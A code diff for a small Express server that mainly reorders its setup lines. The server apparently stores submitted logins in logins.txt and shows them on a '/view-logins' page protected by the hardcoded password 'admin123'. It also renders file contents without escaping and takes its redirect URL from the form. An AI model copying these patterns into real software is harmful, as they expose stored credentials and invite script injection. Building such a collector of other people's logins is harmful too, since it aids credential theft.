@@ -1,5 +1,15 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const fs = require('fs');
+const path = require('path');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
 // Simple password for viewing logins (change this to something secure)
 const VIEW_LOGINS_PASSWORD = 'admin123';
+
+// Middleware to parse form data
+app.use(bodyParser.urlencoded({ extended: false }));
 
 // Route to view logins.txt (password protected)
 app.get('/view-logins', (req, res) => {
@@ -14,17 +24,6 @@ app.get('/view-logins', (req, res) => {
     res.send(`<h2>Logins</h2><pre>${data}</pre>`);
   });
 });
-const express = require('express');
-const bodyParser = require('body-parser');
-const fs = require('fs');
-const path = require('path');
-
-const app = express();
-const PORT = process.env.PORT || 3000;
-// No fixed redirect URL; will use the one from the form
-
-// Middleware to parse form data
-app.use(bodyParser.urlencoded({ extended: false }));
 
 // Serve the HTML file
 app.get('/', (req, res) => {
